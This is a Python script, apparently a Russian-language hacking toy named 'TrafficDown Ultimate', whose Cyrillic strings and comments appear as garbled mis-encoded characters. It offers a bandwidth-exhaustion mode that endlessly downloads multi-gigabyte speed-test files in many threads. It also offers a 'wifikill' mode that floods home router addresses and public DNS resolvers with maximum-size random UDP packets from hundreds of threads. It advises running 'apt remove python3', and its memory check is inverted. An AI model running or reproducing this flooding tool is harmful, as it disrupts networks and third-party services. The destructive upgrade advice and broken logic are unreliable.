# –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –Ω–µ–¥–æ—Å—Ç–∞—é—â–∏—Ö –ø–∞–∫–µ—Ç–æ–≤
import os
import sys
import importlib.util

packages = ["requests", "threading", "customtkinter", "socket", "colorama", "psutil"]
for package in packages:
    installed = importlib.util.find_spec(package)
    if not installed:
        os.system(f"python3 -m pip install {package}" if os.name != "nt" else f"python -m pip install {package}")
    if package != 'customtkinter':
        exec(f'import {package}')

# –û—Å–Ω–æ–≤–Ω—ã–µ –∏–º–ø–æ—Ä—Ç—ã
import requests
import socket
import colorama
import psutil
import threading
import time
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–µ—Ä—Å–∏–∏ Python
if int(sys.version.split(' ')[0].split('.')[1]) < 12:
    input(f'–û–±–Ω–æ–≤–∏—Ç–µ Python –¥–æ 3.12+ ({"apt update && apt upgrade && apt remove python3 && apt install python3" if os.name != "nt" else "–û–±–Ω–æ–≤–∏—Ç–µ —á–µ—Ä–µ–∑ Microsoft Store / python.org"})')
    os._exit(0)

# –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ä–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã: GUI –∏–ª–∏ –∫–æ–Ω—Å–æ–ª—å
useTkinter = True if os.name == 'nt' else False

eat = False
killwifi = False
readed = [0]
readed_lock = threading.Lock()

urls = [
    'https://speed.hetzner.de/10GB.bin',
    'https://speed.hetzner.de/1GB.bin',
    'https://speedtest.selectel.ru/10GB',
    'https://speedtest.selectel.ru/1GB',
]

logo = '''‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ïó
‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïë
‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë
‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñë‚ñë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ñà‚ñà‚ïë‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñë‚ñë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñë‚ñà‚ñà‚ïë‚ñë‚ïö‚ñà‚ñà‚ñà‚ïë
‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïê‚ïù'''
logoweight = 91

functions = [
 {'name':'traffic', 'description':'–Ω–∞—á–∞—Ç—å —Å—ä–µ–¥–∞–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞','handler':lambda: trafficDown()},
 {'name': 'wifikill', 'description':'—É–±–∏—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç','handler':lambda: killWifiF()},
 {'name':'exit','description':'–≤—ã—Ö–æ–¥','handler':lambda: os._exit(0)}
]

# ---- –§–£–ù–ö–¶–ò–ò ----

def downloadThread(url):
    global eat, readed
    headers = {'User-Agent': 'Mozilla/5.0'}

    while eat:
        try:
            chunkSize = 5_000_000
            r = requests.get(url, stream=True, verify=False, timeout=5, headers=headers)
            r.raise_for_status()

            for chunk in r.iter_content(chunk_size=chunkSize):
                if not eat: break
                if not chunk: continue
                chunk_size_mb = len(chunk) / 1024 / 1024

                with readed_lock:
                    readed[0] += len(chunk)

        except requests.exceptions.RequestException:
            pass

def trafficDown():
    global eat
    eat = True
    for _ in range(5):
        for url in urls:
            threading.Thread(target=downloadThread, args=(url,), daemon=True).start()

def sendpackets():
    global killwifi
    while killwifi:
        try:
            if psutil.virtual_memory().free//1024//1024<50:
                threading.Thread(target=makepacket).start()
            else:
                print(f'{colorama.Fore.RED}–ú–∞–ª–æ –û–ó–£! –ñ–¥–µ–º 5 —Å–µ–∫...')
                time.sleep(5)
        except:
            pass

def killWifiF():
    global killwifi
    killwifi = True
    if not useTkinter:
        print(f'–ù–∞–∂–º–∏—Ç–µ ENTER –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ Wi-Fi –∞—Ç–∞–∫–∏')
        threading.Thread(target=sendpackets).start()
        input()
        killwifi = False

def makepacket():
    global killwifi
    while killwifi:
        try:
            threads = []
            for _ in range(500):
                t = threading.Thread(target=packetFlood)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
        except:
            pass

def packetFlood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        targets = [("192.168.1.1", 53), ("192.168.0.1", 80), ("8.8.8.8", 443), ("1.1.1.1", 53), ("192.168.100.1", 8080)]
        target = random.choice(targets)
        while killwifi:
            packet = os.urandom(65507)
            s.sendto(packet, target)
    except:
        pass

if useTkinter:
    from customtkinter import *

    window = CTk()
    window.resizable(False, False)
    set_appearance_mode("dark")
    set_default_color_theme("blue")
    window.protocol("WM_DELETE_WINDOW", lambda: os._exit(0))
    window.title('üî• TrafficDown Ultimate Edition üöÄ')
    window.geometry('500x400')  # –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —Ä–∞–∑–º–µ—Ä –æ–∫–Ω–∞ –¥–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –º–µ—Å—Ç–∞
    window.configure(fg_color="#121212")

    frame = CTkFrame(window, fg_color="#1E1E1E", corner_radius=10)
    frame.pack(fill="both", expand=True, padx=10, pady=10)

    title_label = CTkLabel(frame, text="üöÄ TrafficDown Ultimate", font=("Arial Black", 20), text_color="#00FF00")
    title_label.pack(pady=10)

    statuslbl = CTkLabel(frame, text="üîÑ –û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã...", font=('Arial Black', 14), text_color="#00FF00")
    statuslbl.pack(pady=5)

    traffic_lbl = CTkLabel(frame, text="–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ —Ç—Ä–∞—Ñ–∏–∫–∞: 0 MB", font=('Arial', 12), text_color="#FFD700")
    traffic_lbl.pack(pady=5)

    def updateTrafficDisplay():
        traffic_mb = readed[0] / 1024 / 1024  # –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤ –º–µ–≥–∞–±–∞–π—Ç—ã
        traffic_lbl.configure(text=f"–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ —Ç—Ä–∞—Ñ–∏–∫–∞: {traffic_mb:.2f} MB")

    def startEatCTkinter():
        global eat
        if eat:
            startbtn.configure(text='üî• –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ç—Ä–∞—Ñ–∏–∫-–∞—Ç–∞–∫—É', fg_color="green")
            statuslbl.configure(text='–¢—Ä–∞—Ñ–∏–∫ –≤ –Ω–æ—Ä–º–µ')
            eat = False
        else:
            startbtn.configure(text='‚õî –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ç—Ä–∞—Ñ–∏–∫', fg_color="red")
            eat = True
            trafficDown()

    def startKillCTkinter():
        global killwifi
        if killwifi:
            killwifibtn.configure(text='üíÄ –í—ã–∫–ª—é—á–∏—Ç—å Wi-Fi', fg_color="red")
            statuslbl.configure(text='–ò–Ω—Ç–µ—Ä–Ω–µ—Ç –≤–∫–ª—é—á–µ–Ω')
            killwifi = False
        else:
            killwifibtn.configure(text='‚úÖ –í–∫–ª—é—á–∏—Ç—å Wi-Fi', fg_color="green")
            statuslbl.configure(text='–ò–Ω—Ç–µ—Ä–Ω–µ—Ç –æ—Ç–∫–ª—é—á–µ–Ω!')
            killwifi = True
            threading.Thread(target=makepacket).start()

    startbtn = CTkButton(frame, text="üî• –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–∂–∏—Ä–∞–Ω–∏–µ —Ç—Ä–∞—Ñ–∏–∫–∞", command=startEatCTkinter,
                         fg_color="#007BFF", hover_color="#0056b3", corner_radius=10,
                         font=("Arial", 14, "bold"), text_color="white", width=200, height=40)
    startbtn.pack(pady=10)

    killwifibtn = CTkButton(frame, text="üíÄ –í—ã–∫–ª—é—á–∏—Ç—å Wi-Fi", command=startKillCTkinter,
                            fg_color="#DC3545", hover_color="#A71D2A", corner_radius=10,
                            font=("Arial", 14, "bold"), text_color="white", width=200, height=40)
    killwifibtn.pack(pady=10)

    # –ó–∞–ø—É—Å–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
    def update_gui():
        updateTrafficDisplay()
        window.after(1000, update_gui)  # –æ–±–Ω–æ–≤–ª—è–µ–º –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É

    update_gui()  # –∑–∞–ø—É—Å–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è

    window.mainloop()
else:
    while True:
        os.system('clear' if os.name != 'nt' else 'cls')
        size = os.get_terminal_size()
        x, y = size.columns, size.lines

        # –í—ã–≤–æ–¥ –ª–æ–≥–æ—Ç–∏–ø–∞
        if x >= 91:
            print(f'{colorama.Fore.WHITE}{"\n".join([" " * (x // 2 - logoweight // 2) + line for line in logo.split("\n")])}')
        else:
            text = f'{colorama.Fore.WHITE}(–£–≤–µ–ª–∏—á—å –æ–∫–Ω–æ –∏–ª–∏ —É–º–µ–Ω—å—à–∏ —à—Ä–∏—Ñ—Ç)'
            print(f'{" " * (x // 2 - len(text) // 2)}{text}')

        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–æ–º—É —Ç—Ä–∞—Ñ–∏–∫—É
        traffic_mb = readed[0] / 1024 / 1024  # –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –≤ –º–µ–≥–∞–±–∞–π—Ç—ã
        traffic_text = f'–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ —Ç—Ä–∞—Ñ–∏–∫–∞: {traffic_mb:.2f} MB'
        print(f'{" " * (x // 2 - len(traffic_text) // 2)}{colorama.Fore.YELLOW}{traffic_text}{colorama.Fore.WHITE}')

        # –í—ã–≤–æ–¥ —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥
        for function in functions:
            text = f'[{function["name"]}] - {function["description"]}'
            print(f'{" " * (x // 2 - len(text) // 2 + 6)}{colorama.Fore.CYAN}{text}{colorama.Fore.WHITE}')

        # –í–≤–æ–¥ –∫–æ–º–∞–Ω–¥—ã
        text = '–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏:\t'
        choice = input(f'{" " * (x // 2 - len(text) // 2)}{colorama.Fore.GREEN}')

        for function in functions:
            if function['name'] == choice.lower().strip():
                function['handler']()
